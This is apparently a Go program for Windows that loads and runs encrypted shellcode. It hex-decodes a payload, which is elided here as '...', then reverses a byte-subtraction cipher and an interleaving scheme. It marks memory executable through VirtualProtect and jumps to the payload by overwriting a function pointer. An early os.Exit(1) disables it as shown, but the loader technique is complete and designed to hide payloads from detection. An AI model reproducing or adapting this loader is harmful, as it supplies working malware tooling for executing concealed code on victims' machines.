package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

func decrypter(data []byte, key byte) {
	for i := 0; i < len(data); i++ {
		data[i] -= key
	}
}

func removePrefix(data []byte, keyChar byte) []byte {
	unprefixedData := make([]byte, len(data)/2)

	for i := 0; i < len(unprefixedData); i++ {
		unprefixedData[i] = data[i*2+1]
	}

	if unprefixedData[len(unprefixedData)-1] == keyChar {
		unprefixedData = unprefixedData[:len(unprefixedData)-1]
	}

	return unprefixedData
}

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func main() {
	os.Exit(1)

	scHex := "..."
	sc1, err := hex.DecodeString(scHex)
	if err != nil {
		fmt.Println("Error decoding shellcode:", err)
		os.Exit(1)
	}

	key := byte(0x07)
	keyChar := byte('k')

	decrypter(sc1, key)
	unprefixedData := removePrefix(sc1, keyChar)

	sc := unprefixedData

	f := func() {}
	var oldfperms uint32

	if !VirtualProtect(
		unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))),
		unsafe.Sizeof(uintptr(0)),
		uint32(0x40),
		unsafe.Pointer(&oldfperms)) {
		fmt.Println("VirtualProtect failed!")
		os.Exit(1)
	}

	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		fmt.Println("VirtualProtect failed!")
		os.Exit(1)
	}

	f()
}
